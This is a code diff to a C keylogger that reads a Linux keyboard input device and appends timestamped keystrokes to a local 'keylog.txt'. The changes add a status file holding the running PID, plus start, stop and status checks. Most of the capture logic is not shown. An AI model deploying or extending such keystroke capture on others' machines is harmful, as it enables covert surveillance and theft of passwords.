@@ -7,6 +7,7 @@
 #include <signal.h>
 #include <string.h>
 #include <time.h>
+#include <sys/wait.h>
 
 #define MAX_EVENT_STR_LEN 10
 #define MAX_INPUT_PATH_LEN 256
@@ -44,7 +45,26 @@ char *event_keyboard(void) {
     return keyboard_file;
 }
 
-void initialize_keylogger(const char *logfile) {
+void initialize_keylogger() {
+    const char *log_file = "keylog.txt";
+    const char *status_file = "keylogger_status.txt";
+    char status[16];
+
+    // Check the current status from the status file
+    int fd_status = open(status_file, O_RDONLY);
+    if (fd_status >= 0) {
+        ssize_t bytes_read = read(fd_status, status, sizeof(status) - 1);
+        close(fd_status);
+
+        if (bytes_read > 0) {
+            status[bytes_read] = '\0'; // Null-terminate the status string
+            if (strncmp(status, "running", 7) == 0) {
+                printf("Keylogger is already running.\n");
+                return;
+            }
+        }
+    }
+
     if (keylogger_pid > 0) {
         printf("Keylogger is already running.\n");
         return;
@@ -72,7 +92,7 @@ void initialize_keylogger(const char *logfile) {
             exit(1);
         }
 
-        int fd_log = open(logfile, O_WRONLY | O_CREAT | O_APPEND, 0644);
+        int fd_log = open(log_file, O_WRONLY | O_CREAT | O_APPEND, 0644);
         if (fd_log < 0) {
             perror("Failed to open log file");
             close(fd_input);
@@ -89,6 +109,7 @@ void initialize_keylogger(const char *logfile) {
             "F9", "F10"
         };
 
+        //Keylogger session record message
         time_t now = time(NULL);
         char *time_str = ctime(&now);
 
@@ -116,17 +137,57 @@ void initialize_keylogger(const char *logfile) {
         exit(0);
     }
 
+    // Parent process: Update status file
+    fd_status = open("keylogger_status.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd_status < 0) {
+        perror("Failed to update keylogger status");
+    } else {
+        char status[32];
+        snprintf(status, sizeof(status), "running %d\n", keylogger_pid);
+        write(fd_status, status, strlen(status));
+        close(fd_status);
+    }
+
     printf("Keylogger started with PID %d.\n", keylogger_pid);
 }
 
-void stop_keylogger(const char *logfile) {
-    if (keylogger_pid > 0) {
-        int fd_log = open(logfile, O_WRONLY | O_CREAT | O_APPEND, 0644);
+void stop_keylogger() { 
+    const char *status_file = "keylogger_status.txt";
+    const char *log_file = "keylog.txt";
+    char status[32];
+    pid_t pid_from_file = -1;
+
+    // Check the current status and PID from keylogger_status.txt
+    int fd_status = open(status_file, O_RDONLY);
+    if (fd_status < 0) {
+        perror("Failed to read keylogger status");
+        printf("Keylogger status unknown. Assuming it is not running.\n");
+        return;
+    }
+
+    ssize_t bytes_read = read(fd_status, status, sizeof(status) - 1);
+    close(fd_status);
+
+    if (bytes_read > 0) {
+        status[bytes_read] = '\0'; // Null-terminate the string
+        if (sscanf(status, "running %d", &pid_from_file) == 1) {
+            keylogger_pid = pid_from_file;
+        } else if (strncmp(status, "stopped", 7) == 0) {
+            printf("Keylogger is already stopped.\n");
+            return;
+        }
+    }
+
+    // Check if the keylogger process is running
+    if (keylogger_pid > 0 && kill(keylogger_pid, 0) == 0) {
+        // Open the log file
+        int fd_log = open(log_file, O_WRONLY | O_CREAT | O_APPEND, 0644);
         if (fd_log < 0) {
             perror("Failed to open log file");
-            exit(1);
+            return;
         }
 
+        // Log the session end
         time_t now = time(NULL);
         char *time_str = ctime(&now);
         if (time_str && time_str[strlen(time_str) - 1] == '\n') {
@@ -137,19 +198,44 @@ void stop_keylogger(const char *logfile) {
         write(fd_log, timestamp, strlen(timestamp));
         close(fd_log);
 
-        kill(keylogger_pid, SIGINT);
+        // Terminate the keylogger process
+        if (kill(keylogger_pid, SIGINT) < 0) {
+            perror("Failed to stop the keylogger process. Ensure you have the correct permissions.");
+            return;
+        }
         waitpid(keylogger_pid, NULL, 0);
         printf("Keylogger stopped.\n");
         keylogger_pid = -1;
+
+        // Update status file to "stopped"
+        fd_status = open(status_file, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        if (fd_status < 0) {
+            perror("Failed to update keylogger status");
+        } else {
+            write(fd_status, "stopped\n", 8);
+            close(fd_status);
+        }
     } else {
         printf("Keylogger is not running.\n");
     }
 }
 
 void check_keylogger_status() {
-    if (keylogger_pid > 0) {
-        printf("Keylogger is running with PID %d.\n", keylogger_pid);
-    } else {
-        printf("Keylogger is not running.\n");
+    char status[16];
+    int fd_status = open("keylogger_status.txt", O_RDONLY);
+    if (fd_status < 0) {
+        perror("Failed to read keylogger status");
+        printf("Keylogger status unknown.\n");
+        return;
     }
+
+    ssize_t bytes_read = read(fd_status, status, sizeof(status) - 1);
+    if (bytes_read > 0) {
+        status[bytes_read] = '\0'; // Null-terminate
+        printf("Keylogger status: %s", status);
+    } else {
+        printf("Keylogger status unknown.\n");
+    }
+
+    close(fd_status);
 }
